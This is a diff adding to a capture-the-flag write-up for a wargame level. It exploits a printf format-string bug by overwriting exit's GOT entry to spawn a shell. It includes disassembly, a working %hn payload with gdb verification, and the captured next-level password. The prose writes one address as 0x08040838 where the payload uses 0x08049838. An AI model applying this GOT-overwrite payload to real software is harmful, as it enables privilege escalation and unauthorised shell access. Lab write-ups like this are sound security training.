@@ -11,7 +11,7 @@ Usage: ./main.sh
 |        |                                                                    |
 | ------ | ------------------------------------------------------------------ |
 | level5 | `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a` |
-| level6 | ``                                                                 |
+| level6 | `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31` |
 
 ## Steps to resolve on VM
 
@@ -41,11 +41,26 @@ Lets debug the binary
 
 ```shell
 gdb-peda$ pdisas main
-# (...)
+  0x0804850a <+6>:     call   0x80484c2 <n>                     # call n()
+
 gdb-peda$ pdisas o
-# (...)
+  0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0         # 0x80485f0: "/bin/sh"
+  0x080484b1 <+13>:    call   0x80483b0 <system@plt>            # call system("/bin/sh")
+  0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
+  0x080484bd <+25>:    call   0x8048390 <_exit@plt>             # call _exit(1)
 
 gdb-peda$ pdisas n
+  0x080484cb <+9>:     mov    eax,ds:0x8049848                  # 0x8049848 <stdin@@GLIBC_2.0>
+  0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
+  0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
+  0x080484dc <+26>:    lea    eax,[ebp-0x208]
+  0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
+  0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>             # call fgets(buf, 0x200, stdin)
+  0x080484ea <+40>:    lea    eax,[ebp-0x208]
+  0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
+  0x080484f3 <+49>:    call   0x8048380 <printf@plt>            # call printf(buf)
+  0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
+  0x080484ff <+61>:    call   0x80483d0 <exit@plt>              # call exit(1)
 ```
 
 We need to call `o`-function that creates a new shell.
@@ -94,17 +109,62 @@ The buffer pointer is 4 addresses before the printf argument.
 
 As `0x080484a4` is a big value, instead of print this value, we will split this integer with two short integers:
 
-- High-order bytes: `0x0804`
-- Low-order bytes: `0x84a4`
+- High-order bytes: `0x0804` will be written at `0x08040838 + 2`
+- Low-order bytes: `0x84a4` will be written at `0x08040838`
 
 Basically, our format string should be something like:
 
 ```
-   ______________________________________
-   |                                    |
 ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %4$hn +  %<VALUE_2>x + %5$hn
-                |______________________________________________|
+   _____________________________________|                      |
+   |           ________________________________________________|
+   |           |
+ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %4$hn +  %<VALUE_2>x + %5$hn
+   |           |            |                       |
+0x0804083a 0x08040838  (0x0804 - 8)         (0x84a4 - 0x0804)
 
+=> "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"
+```
+
+> \_Note: VALUE_1 has to be greater than VALUE_2. Otherwise, switch addresses
+
+Lets confirm that:
+
+```bash
+gdb-peda$ b *n+54 # after printf
+> Breakpoint 1 at 0x80484f8
+
+gdb-peda$ run < <(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"')
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff420 --> 0xbffff430 --> 0x804983a --> 0x53e00804
+0004| 0xbffff424 --> 0x200
+0008| 0xbffff428 --> 0xb7fd1ac0 --> 0xfbad2088
+0012| 0xbffff42c --> 0xb7ff37d0 (<__libc_memalign+16>:	add    ebx,0xb824)
+0016| 0xbffff430 --> 0x804983a --> 0x53e00804                    # <----- %4$hn
+0020| 0xbffff434 --> 0x8049838 --> 0x80484a4 (<o>:	push   ebp)  # <----- %5$hn
+0024| 0xbffff438 ("%2044x%4$hn%31904x%5$hn\n")
+[------------------------------------------------------------------------------]
+
+gdb-peda$ x/x 0x8049838
+> 0x8049838 <exit@got.plt>:	0x080484a4 # Perfect ! It contains our address
+
+gdb-peda$ continue
+> [New process 27345]
+  process 27345 is executing new program: /bin/dash
+  (...)
+```
+
+We perfectly overwritted the address of exit in the Global Offset Table. The new shell has been created but without setuid.
+Let's try without gdb
+
+```shell
+python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/exploit5
+cat /tmp/exploit5 - | ~/level5
+
+$ whoami
+> level6
+$ cat /home/user/level6/.pass
+> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
 
 ---
